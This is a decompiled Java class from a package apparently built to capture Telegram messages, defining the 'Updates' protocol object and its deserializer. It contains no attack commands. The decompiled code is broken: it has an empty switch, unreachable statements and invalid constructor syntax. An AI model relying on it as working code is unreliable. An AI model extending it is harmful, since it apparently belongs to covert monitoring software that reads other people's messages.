package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$Updates
  extends TLObject
{
  public int chat_id;
  public ArrayList chats;
  public int date;
  public ArrayList entities;
  public int flags;
  public int from_id;
  public int fwd_date;
  public TLRPC.Peer fwd_from_id;
  public int id;
  public TLRPC.MessageMedia media;
  public boolean media_unread;
  public boolean mentioned;
  public String message;
  public boolean out;
  public int pts;
  public int pts_count;
  public int reply_to_msg_id;
  public int seq;
  public int seq_start;
  public boolean unread;
  public TLRPC.Update update;
  public ArrayList updates;
  public int user_id;
  public ArrayList users;
  public int via_bot_id;
  
  public TLRPC$Updates()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.updates = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.users = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.chats = localArrayList;
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    this.entities = localArrayList;
  }
  
  public static Updates TLdeserialize(AbstractSerializedData paramAbstractSerializedData, int paramInt, boolean paramBoolean)
  {
    Object localObject = null;
    switch (paramInt)
    {
    }
    while ((localObject == null) && (paramBoolean))
    {
      localObject = new java/lang/RuntimeException;
      Object[] arrayOfObject = new Object[1];
      Integer localInteger = Integer.valueOf(paramInt);
      arrayOfObject[0] = localInteger;
      String str = String.format("can't parse magic %x in Updates", arrayOfObject);
      ((RuntimeException)localObject).<init>(str);
      throw ((Throwable)localObject);
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updates;
      ((TLRPC.TL_updates)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updateShortMessage;
      ((TLRPC.TL_updateShortMessage)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updateShortSentMessage;
      ((TLRPC.TL_updateShortSentMessage)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updateShort;
      ((TLRPC.TL_updateShort)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updateShortChatMessage;
      ((TLRPC.TL_updateShortChatMessage)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updatesCombined;
      ((TLRPC.TL_updatesCombined)localObject).<init>();
      continue;
      localObject = new com/vvt/capture/telegram/internal/TLRPC$TL_updatesTooLong;
      ((TLRPC.TL_updatesTooLong)localObject).<init>();
    }
    if (localObject != null) {
      ((Updates)localObject).readParams(paramAbstractSerializedData, paramBoolean);
    }
    return (Updates)localObject;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$Updates.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */